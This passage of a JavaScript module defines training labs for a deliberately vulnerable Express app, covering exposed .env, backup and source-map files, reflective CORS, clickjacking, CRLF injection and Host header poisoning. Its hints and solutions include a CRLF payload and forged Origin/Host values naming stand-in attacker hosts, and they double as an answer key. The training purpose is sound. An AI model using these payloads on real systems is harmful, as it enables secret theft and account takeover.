    summary: 'Static file serving exposes the app configuration directory.',
    briefing: 'The lab app serves a configuration directory as static content, including a generated production .env file. Request it directly.',
    scenario: 'A deployment script copies secrets into the web root. The web server is configured to serve the whole directory.',
    objectives: [
      'Discover exposed configuration files',
      'Request the generated .env file',
      'Extract the flag from its contents'
    ],
    prerequisites: [],
    estimatedMinutes: 15,
    technology: ['Node.js', 'Express'],
    owaspRef: 'A05:2021 - Security Misconfiguration',
    asvsRef: 'V14.3.2',
    wstgRef: 'WSTG-CONF-02',
    cwe: 'CWE-538',
    attackTechnique: 'T1552.001',
    hints: [
      'Configuration files are often left in the web root.',
      'Request /labs/disclosure-env-file/.env.'
    ],
    solution: 'Request /labs/disclosure-env-file/.env. The generated file contains a debug secret whose value is the instance flag.'
  }),
  L({
    slug: 'disclosure-backup-file',
    title: 'Leftover Backup File Disclosure',
    domain: 'Information Disclosure',
    category: 'Security Misconfiguration',
    level: 1,
    color: 'slate',
    summary: 'An old .bak copy of a source file was left in the public directory.',
    briefing: 'A billing JavaScript file is served publicly. If a developer left billing.js.bak next to it, the backup may be served just as plainly. Request it and inspect the embedded configuration.',
    scenario: 'A hotfix was applied directly to production. The editor created a .bak copy and it was never removed.',
    objectives: [
      'Enumerate backup and editor artifacts',
      'Request the .bak file',
      'Recover the flag from the backup source'
    ],
    prerequisites: [],
    estimatedMinutes: 15,
    technology: ['Node.js', 'Express', 'Static files'],
    owaspRef: 'A05:2021 - Security Misconfiguration',
    asvsRef: 'V14.3.2',
    wstgRef: 'WSTG-CONF-04',
    cwe: 'CWE-538',
    attackTechnique: 'T1083',
    hints: [
      'If billing.js exists, check billing.js.bak.',
      'Request /labs/disclosure-backup-file/billing.js.bak.'
    ],
    solution: 'Request /labs/disclosure-backup-file/billing.js.bak. The backup contains a development config object with the flag.'
  }),
  L({
    slug: 'disclosure-source-map',
    title: 'Exposed Source Map',
    domain: 'Information Disclosure',
    category: 'Security Misconfiguration',
    level: 2,
    color: 'slate',
    summary: 'A production JavaScript bundle ships with its source map still public.',
    briefing: 'The production bundle references a .map file. The map includes sourcesContent, allowing you to reconstruct the original source. Find the secret that should never have shipped.',
    scenario: 'A frontend build was deployed without stripping source maps. The original TypeScript includes a private configuration object.',
    objectives: [
      'Read the sourceMappingURL from the bundle',
      'Fetch and parse the source map',
      'Recover the flag from sourcesContent'
    ],
    prerequisites: ['disclosure-backup-file'],
    estimatedMinutes: 25,
    technology: ['Node.js', 'Express', 'JavaScript source maps'],
    owaspRef: 'A05:2021 - Security Misconfiguration',
    asvsRef: 'V14.3.2',
    wstgRef: 'WSTG-CONF-04',
    cwe: 'CWE-540',
    attackTechnique: 'T1083',
    hints: [
      'Check the last line of /labs/disclosure-source-map/js/app.bundle.js.',
      'Fetch the sourceMappingURL and inspect the sourcesContent array.'
    ],
    solution: 'Fetch /labs/disclosure-source-map/js/app.bundle.js.map and inspect sourcesContent. The original source contains a private config object with the flag.'
  }),
  L({
    slug: 'cors-wildcard-credentials',
    title: 'Insecure CORS with Credentials',
    domain: 'CORS & Security Headers',
    category: 'Security Misconfiguration',
    level: 3,
    color: 'blue',
    summary: 'The API reflects any Origin and allows credentials.',
    briefing: 'The API reflects the caller Origin into Access-Control-Allow-Origin and sets Access-Control-Allow-Credentials: true. A page on any origin can read the authenticated response. Make a cross-origin request with a foreign Origin and recover the flag.',
    scenario: 'A partner integration needed CORS. The developer reflected the Origin header to support every partner domain.',
    objectives: [
      'Inspect CORS response headers',
      'Send a request with a foreign Origin and credentials',
      'Read the protected API response and capture the flag'
    ],
    prerequisites: ['api-bola'],
    estimatedMinutes: 30,
    technology: ['Node.js', 'Express', 'CORS'],
    owaspRef: 'A05:2021 - Security Misconfiguration',
    asvsRef: 'V14.5.3',
    wstgRef: 'WSTG-CLNT-11',
    cwe: 'CWE-942',
    attackTechnique: 'T1185',
    hints: [
      'Send an Origin header such as http://evil.example to /labs/cors-wildcard-credentials/api/secret.',
      'The response reflects that origin and allows credentials. A foreign origin can read apiKey and flag.'
    ],
    solution: 'Request /labs/cors-wildcard-credentials/api/secret with Origin: http://evil.example and the lab session cookie. The API reflects the origin, allows credentials, and returns the flag.'
  }),
  L({
    slug: 'clickjacking-missing-xfo',
    title: 'Clickjacking via Missing Frame Protection',
    domain: 'CORS & Security Headers',
    category: 'Security Misconfiguration',
    level: 2,
    color: 'blue',
    summary: 'No X-Frame-Options or CSP frame-ancestors is set.',
    briefing: 'The account page can be embedded in a cross-origin iframe. The simulated attacker page frames the delete-account button under a prize button. Trigger a deletion from inside the frame and capture the flag.',
    scenario: 'A settings page supports legacy embeds and has no frame-ancestors policy. The delete action is a simple POST form.',
    objectives: [
      'Confirm the target can be framed',
      'Understand how an overlay steals a click',
      'Trigger the framed action and recover the flag'
    ],
    prerequisites: ['csrf-email-change'],
    estimatedMinutes: 25,
    technology: ['Node.js', 'Express', 'HTML iframes'],
    owaspRef: 'A05:2021 - Security Misconfiguration',
    asvsRef: 'V14.4.1',
    wstgRef: 'WSTG-CLNT-09',
    cwe: 'CWE-1021',
    attackTechnique: 'T1185',
    hints: [
      'Open /labs/clickjacking-missing-xfo/attacker-page and inspect the invisible iframe.',
      'The framed delete form includes a frame marker. Submit it from the frame to trigger the reward.'
    ],
    solution: 'Open the attacker page, click the overlay, and let the framed POST /delete-account run. The lab validates the iframe context and returns the flag.'
  }),
  L({
    slug: 'crlf-header-injection',
    title: 'CRLF Injection / Response Splitting',
    domain: 'CORS & Security Headers',
    category: 'Injection',
    level: 4,
    color: 'blue',
    summary: 'A redirect target is written into a raw header with no CRLF stripping.',
    briefing: 'The redirect endpoint writes the dest parameter into a raw HTTP response header. Inject a CRLF sequence to smuggle extra headers into the response, then retrieve the flag.',
    scenario: 'A marketing redirect service was written directly against the socket for performance. The destination is not sanitised.',
    objectives: [
      'Understand CRLF and HTTP response splitting',
      'Inject an extra response header through dest',
      'Trigger the flag endpoint after a successful split'
    ],
    prerequisites: ['cors-wildcard-credentials'],
    estimatedMinutes: 40,
    technology: ['Node.js', 'Express', 'HTTP'],
    owaspRef: 'A03:2021 - Injection',
    asvsRef: 'V5.3.2',
    wstgRef: 'WSTG-INPV-15',
    cwe: 'CWE-113',
    attackTechnique: 'T1190',
    hints: [
      'The dest value is written after Location: without stripping CR or LF.',
      'Use %0d%0aSet-Cookie:%20pwned=1 in dest and inspect the raw response with curl -i.'
    ],
    solution: 'Send /labs/crlf-header-injection/go?dest=%0d%0aSet-Cookie:%20pwned=1%0d%0aX-Injected:%20yes. The raw response includes the injected headers, the lab marks the split, and /flag returns the flag.'
  }),
  L({
    slug: 'host-header-poisoning',
    title: 'Host Header Poisoning',
    domain: 'CORS & Security Headers',
    category: 'Security Misconfiguration',
    level: 3,
    color: 'blue',
    summary: 'Password reset links are built from the incoming Host header.',
    briefing: 'The password reset service constructs the reset link from the request Host header. Send a reset request with a forged Host value and make the generated link point to an attacker domain.',
    scenario: 'A reverse proxy forwards requests without validating Host. The application trusts req.headers.host when building absolute URLs.',
    objectives: [
      'Inspect how absolute URLs are generated',
      'Send a reset request with a forged Host header',
      'Poison the reset link and capture the flag'
    ],
    prerequisites: ['csrf-get-based'],
    estimatedMinutes: 30,
    technology: ['Node.js', 'Express', 'HTTP headers'],
    owaspRef: 'A05:2021 - Security Misconfiguration',
    asvsRef: 'V14.4.1',
    wstgRef: 'WSTG-CONF-07',
    cwe: 'CWE-644',
    attackTechnique: 'T1190',
    hints: [
      'Use curl with an explicit Host header, or a proxy that lets you edit Host.',
      'Send Host: evil-attacker.test to POST /labs/host-header-poisoning/request-reset.'
    ],
    solution: 'Send POST /labs/host-header-poisoning/request-reset with Host: evil-attacker.test. The generated reset link uses the forged host, and the response includes the flag.'
  })
];

module.exports = { labs, LEVELS };
